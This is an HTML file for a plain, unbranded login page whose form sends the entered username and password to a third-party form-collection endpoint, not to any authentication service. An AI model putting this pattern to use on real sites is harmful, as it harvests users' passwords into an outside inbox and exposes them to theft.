<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
}

.login-box{
    width:350px;
    background:white;
    padding:35px;
    border-radius:15px;
    box-shadow:0 10px 30px rgba(0,0,0,.3);
}

.login-box h2{
    text-align:center;
    margin-bottom:25px;
    color:#333;
}

.input-box{
    margin-bottom:20px;
}

.input-box input{
    width:100%;
    padding:12px;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    border:none;
    border-radius:8px;
    background:#007BFF;
    color:white;
    font-size:17px;
    cursor:pointer;
}

button:hover{
    background:#0056b3;
}
</style>

</head>
<body>

<div class="login-box">

<h2>Login</h2>

<form action="https://formspree.io/f/xgojpbdg" method="POST">

<div class="input-box">
<input
type="text"
name="Username"
placeholder="Enter Username"
required>
</div>

<div class="input-box">
<input
type="password"
name="Password"
placeholder="Enter Password"
required>
</div>

<button type="submit">Login</button>

</form>

</div>

</body>
</html>
